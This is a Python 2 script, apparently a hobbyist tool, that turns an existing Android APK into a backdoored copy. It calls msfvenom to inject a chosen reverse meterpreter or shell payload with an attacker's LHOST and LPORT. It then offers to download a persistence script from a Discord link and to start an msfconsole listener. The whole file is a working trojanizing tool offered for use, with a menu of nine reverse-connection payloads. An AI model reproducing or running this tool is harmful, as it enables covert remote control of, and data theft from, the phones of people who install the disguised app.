#!/usr/bin/python
# -*- coding: utf8 -*-

import os
from select import select
from time import sleep
import sys

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        elif color.lower() == "pink":
            attr.append('35')

        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
def arquivo(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print 'erro'.format(**locals())
            
    
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


def hours():
    os.system("clear")
    print color ("  Hours        Date","green")
    os.system(' date +"  %R      %D" ')

def err():
    print color(" [ X ] Error","red")
    print("")
    print color(" Start setup.py to fix the error","yellow")
    sys.exit()

def apkname():
    try:
       return sys.argv[1]
    except:
        print color(" [X] Original apk not found","red")
        print color(' Example: python main.py game.apk',"green")
        sys.exit()

def devname():
    return'''
    YouTube: https://encurtador.com.br/nuyH6
    Discord: .png#6667
    '''
def enter():
    return raw_input(color("Enter to continue","green"))

apkname()

try:
    str(apkname()).index(".apk")
except:
    print color(" [X] Original apk not found","red")
    print color(' Example: python main.py game.apk',"green")
    sys.exit()

hours()
print color('''
                     ___       _.--.
    \`.|\..----...-'`   `-._.-'_.-'`
    /  ' `         ,       __.--'
    )/' _/     \   `-_,   /
    `-'" `"\_  ,_.-;_.-\_ ',     APK ORIGINAL + BACKDOOR  
        _.-'_./   {_.'   ; /
       {_.-``-'         {_/
''',"pink")

if os.system("apktool --version > /dev/null 2>&1"):
    err()
else:
    print color(" [ ✔ ] apktool ","yellow")
sleep(1.0)
if os.system("cat /bin/zipalign > /dev/null 2>&1"):
    err()
else:
    print color(" [ ✔ ] zipalign ","yellow")
sleep(1.0)
if os.system("apksigner --version > /dev/null 2>&1"):
    err()
else:
    print color(" [ ✔ ] apksigner ","yellow")
sleep(1.0)
if os.system("cat /bin/msfvenom > /dev/null 2>&1"):
    err()
else:
    print color(" [ ✔ ] metasploit-framework ","yellow")
sleep(1.0)
print color("""
    All Ready =]""","green")
print color(devname(),"blue")
sleep(1.0)
enter()
def create(shell):
    lhost = raw_input(color("LHOST: ","yellow"))
    lport = raw_input(color("LPORT: ","yellow"))
    nameapk = raw_input(color("NameApk: ","yellow"))
    print color("""
     |\.-"-./|
     \`     `/
     |= ^Y^ =|
     \__ ^ __/
     /`=+o+=`\   ~ creating apk ...
    |         |
    | (     ) |
    (,,)---(,,)
    ""","green")
    try:
        os.system("msfvenom -x "+apkname()+" -p "+shell+" LHOST="+lhost+" LPORT="+lport+" -o save/"+nameapk+".apk")
        print color("Save:","green")
        os.system("echo $PWD/save/"+nameapk+".apk")
    except:
        print color("Critical error","red")
    print color("""
    If you need help contact me on discord.
    Nick: .png#6667
    ""","pink")
    enter()
    print color("""
    Want to get persistence.sh?
    ""","green")
    ps = raw_input(color("Y/N: ","yellow"))
    if ps.lower() == "y":
        print color(" Waiting...","green")
        os.system("wget https://cdn.discordapp.com/attachments/629400591910830090/772989610997448705/persistence.sh > /dev/null 2>&1")
        print color("""
        OK =] 
        ""","green")
        print color(" Save:","blue")
        os.system("echo $PWD/persistence.sh")
        enter()
    elif ps.lower() == "n":
        print("")
    else:
        print("")
    print color("""
    Want to run msfconsole?
    ""","green")
    msf = raw_input(color("Y/N: ","yellow"))
    if msf.lower() == "y":
        msflhost = raw_input(color("msflhost: ","green"))
        msflport = raw_input(color("msflport: ","green"))
        os.system("cp config/temp.rc temp.rc")
        arquivo("temp.rc","shell",shell)
        arquivo("temp.rc","msflhost",msflhost)
        arquivo("temp.rc","msflport",msflport)
        os.system("mv temp.rc save/"+nameapk+".rc")
        os.system('xterm -T "MSFCONSOLE" -geometry 100x50 -e "msfconsole -r save/'+nameapk+'.rc"')
    elif msf.lower() == "n":
        print("")
    else:
        print("")


op = "z"
while op.lower() != "j":
    hours()
    print color("""
  /\-/\    /\-/\    /\-/\    /\-/\    /\-/\    /\-/\    /\-/\ 
 (=^Y^=)  (=^Y^=)  (=^Y^=)  (=^Y^=)  (=^Y^=)  (=^Y^=)  (=^Y^=)  
  (>o<)    (>o<)    (>o<)    (>o<)    (>o<)    (>o<)    (>o<)              
""","pink")
    print color("   Select Apk: "+apkname(),"red")
    print color ("""
    ++++++++++++++++++++++++++++++++++++++++++++++++++
    +                                                +      
    + [ A ]  android/meterpreter/reverse_http        +    
    + [ B ]  android/meterpreter/reverse_https       +
    + [ C ]  android/meterpreter/reverse_tcp         +
    + [ D ]  android/meterpreter_reverse_http        +
    + [ E ]  android/meterpreter_reverse_https       +
    + [ F ]  android/meterpreter_reverse_tcp         +
    + [ G ]  android/shell/reverse_http              +
    + [ H ]  android/shell/reverse_https             +
    + [ I ]  android/shell/reverse_tcp               +
    + [ J ]  EXIT                                    +
    +                                                +      
    ++++++++++++++++++++++++++++++++++++++++++++++++++
    ""","green")
    sleep(1.0)
    op = raw_input(color("select: ","green"))
    if op.lower() == "a":
        create("android/meterpreter/reverse_http")
    elif op.lower() == "b":
        create("android/meterpreter/reverse_https")
    elif op.lower() == "c":
        create("android/meterpreter/reverse_tcp")
    elif op.lower() == "d":
        create("android/meterpreter_reverse_http")
    elif op.lower() == "e":
        create("android/meterpreter_reverse_https")
    elif op.lower() == "f":
        create("android/meterpreter_reverse_tcp")
    elif op.lower() == "g":
        create("android/shell/reverse_http")
    elif op.lower() == "h":
        create("android/shell/reverse_https")
    elif op.lower() == "i":
        create("android/shell/reverse_tcp")
    elif op.lower() == "j":
        os.system("clear")
    else:
        os.system("clear")


